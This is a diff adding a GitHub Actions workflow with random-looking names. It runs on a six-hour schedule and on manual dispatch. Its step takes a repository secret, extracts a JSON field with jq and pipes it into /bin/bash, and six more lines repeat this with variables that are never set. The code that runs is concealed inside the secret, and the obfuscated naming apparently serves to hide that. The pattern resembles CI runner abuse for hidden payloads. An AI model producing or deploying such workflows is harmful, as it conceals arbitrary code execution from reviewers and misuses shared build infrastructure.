@@ -1,0 +1,24 @@
+name: keshixujiahuanayou
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: keshixujiahuanayou
+        env:
+          vba4669: ${{ secrets.vba4669 }}
+        run: |
+          echo $vba4669 | jq -r .zj37149 | /bin/bash
+          echo $ni33 | jq -r .yi051 | /bin/bash
+          echo $hec388 | jq -r .c83474 | /bin/bash
+          echo $lvpps664 | jq -r .aq47 | /bin/bash
+          echo $ejf5534 | jq -r .de5312 | /bin/bash
+          echo $obv57 | jq -r .p92 | /bin/bash
+          echo $wcsw4 | jq -r .rprl9081 | /bin/bash
+
